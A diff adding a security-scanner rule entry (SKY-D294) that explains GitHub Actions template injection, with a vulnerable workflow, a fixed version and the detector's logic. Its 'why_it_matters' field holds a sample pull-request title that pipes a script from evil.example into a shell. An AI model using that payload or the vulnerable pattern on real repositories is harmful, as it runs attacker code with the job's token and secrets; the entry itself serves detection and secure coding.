@@ -1,0 +1,172 @@
+id: SKY-D294
+title: GitHub Actions template injection
+family: ci-cd
+severity: CRITICAL
+severity_note: >-
+  The catalog lists CRITICAL, but the detector grades each finding by the
+  text and who can trigger the job: HIGH for free text from an account
+  without write access, MEDIUM for structured text from such an account or
+  free text from an unknown caller, LOW otherwise. It does not currently
+  report CRITICAL.
+languages: [GitHub Actions workflows, composite actions]
+
+what_it_is: >-
+  GitHub Actions replaces every `${{ … }}` expression with its value before
+  the step runs. When that value is text someone else wrote, such as a pull
+  request title or an issue comment, and it lands inside a `run:` script,
+  the text becomes part of the shell command.
+
+why_it_matters: >-
+  A pull request titled `x"; curl -s https://evil.example/x.sh | sh; echo "`
+  runs that command on your runner, with the job's token and secrets. On a
+  `pull_request_target` or `issue_comment` workflow, anyone with a GitHub
+  account can do this.
+
+flagged_example:
+  language: yaml
+  filename: .github/workflows/pr-title.yml
+  expect_line: 13
+  code: |
+    name: PR title
+    on:
+      pull_request_target:
+        types: [opened, edited, synchronize]
+    permissions:
+      pull-requests: read
+    jobs:
+      check-title:
+        runs-on: ubuntu-latest
+        steps:
+          - name: Require a Conventional Commits title
+            run: |
+              title="${{ github.event.pull_request.title }}"
+              if ! echo "$title" | grep -Eq '^(feat|fix|docs|chore)(\(.+\))?: '; then
+                echo "::error::PR title must look like 'fix(api): short summary'"
+                exit 1
+              fi
+
+not_flagged_example:
+  language: yaml
+  filename: .github/workflows/pr-title.yml
+  code: |
+    name: PR title
+    on:
+      pull_request_target:
+        types: [opened, edited, synchronize]
+    permissions:
+      pull-requests: read
+    jobs:
+      check-title:
+        runs-on: ubuntu-latest
+        steps:
+          - name: Require a Conventional Commits title
+            env:
+              TITLE: ${{ github.event.pull_request.title }}
+            run: |
+              if ! echo "$TITLE" | grep -Eq '^(feat|fix|docs|chore)(\(.+\))?: '; then
+                echo "::error::Rename PR #${{ github.event.pull_request.number }}"
+                exit 1
+              fi
+  why: >-
+    The title reaches the script as the environment variable `$TITLE`, which
+    the shell treats as data, never as code. The one expression left in the
+    script is the pull request number, which GitHub always fills with
+    digits, so nobody can shape it.
+
+how_skylos_decides:
+  - >-
+    Reads `*.yml` and `*.yaml` files under any `.github/workflows` folder,
+    and `action.yml` / `action.yaml` composite actions.
+  - >-
+    Looks at the places where text becomes code: a step's `run:`, a job's
+    `container.options` and `services.*.options`, composite-action steps,
+    and code inputs of 16 known actions, such as `actions/github-script`'s
+    `script`.
+  - >-
+    Parses each `${{ … }}` in those places. Only values that end up in the
+    text count: a comparison such as `== 'main'` or a `contains()` result
+    does not.
+  - >-
+    Decides whether someone else can shape the value. `github.event` fields
+    are classed by GitHub's payload schema: free text such as titles, bodies
+    and branch names counts; fixed values such as `pull_request.number` and
+    `head.sha` do not. `github.head_ref` counts; `secrets.*`, `vars.*`,
+    `github.actor` and `github.ref_name` do not.
+  - >-
+    Follows indirect values to where they are set: `env.*` through step, job
+    and workflow `env:`, `matrix.*`, `steps.<id>.outputs.*` back to the line
+    that writes `$GITHUB_OUTPUT`, `needs.<job>.outputs.*`, and `inputs.*`.
+  - >-
+    Grades severity by who can start the job. `issues`, `issue_comment`,
+    `pull_request_target`, review and discussion events, and `workflow_run`
+    reachable from a fork are open to outsiders, for the event types an
+    outsider can cause, unless the job's `if:` keeps them out or a job it
+    `needs` checks the actor's permission. A permission check in the same
+    job does not count. `pull_request` and `push` give LOW.
+  - >-
+    Reports one finding per expression, on the line where it appears.
+
+source_refs:
+  - path: skylos/rules/config/cicd/github_actions.py
+    symbol: "def _scan_template_injection("
+  - path: skylos/rules/config/cicd/template_injection.py
+    symbol: "def _grade("
+    note: severity from text shape and audience.
+  - path: test/test_github_actions_template_injection.py
+    symbol: "def test_values_an_attacker_cannot_shape_are_not_injection"
+
+fix:
+  explanation: >-
+    Pass the value through `env:` and use the quoted shell variable in the
+    script. The expression is then expanded into YAML data, not into code.
+  filename: .github/workflows/pr-title.yml
+  code: |
+    name: PR title
+    on:
+      pull_request_target:
+        types: [opened, edited, synchronize]
+    permissions:
+      pull-requests: read
+    jobs:
+      check-title:
+        runs-on: ubuntu-latest
+        steps:
+          - name: Require a Conventional Commits title
+            env:
+              TITLE: ${{ github.event.pull_request.title }}
+            run: |
+              if ! echo "$TITLE" | grep -Eq '^(feat|fix|docs|chore)(\(.+\))?: '; then
+                echo "::error::PR title must look like 'fix(api): short summary'"
+                exit 1
+              fi
+
+false_alarms_and_suppression:
+  misfires:
+    - >-
+      Workflows triggered by `pull_request` or `push` still get LOW findings:
+      the text comes from someone with write access, or from a fork's pull
+      request, which runs with a read-only token and no secrets.
+    - >-
+      A value set through `$GITHUB_ENV` cannot be traced and is reported as
+      LOW; inputs of composite actions, and string inputs of reusable
+      workflows without a caller in the repository, are MEDIUM.
+    - >-
+      The flagged example also gets SKY-D290, a separate and real finding
+      about its `pull_request_target` trigger. Moving the title to `env:`
+      clears both.
+  suppress:
+    - text: >-
+        In YAML, write exactly one rule per marker, on the reported line or
+        on the line directly above it. It may also be a shell comment inside
+        the `run:` block.
+      language: yaml
+      code: |
+        run: |
+          # skylos: ignore[SKY-D294] value is validated by the previous step
+          echo "${{ steps.check.outputs.slug }}"
+    - text: >-
+        `[tool.skylos] ignore = ["SKY-D294"]` turns the rule off for the whole
+        project. A baseline also works, but it records the absolute file
+        path, so it does not match in a checkout at another location.
+
+related: [SKY-D290, SKY-D300, SKY-D353, SKY-D212]
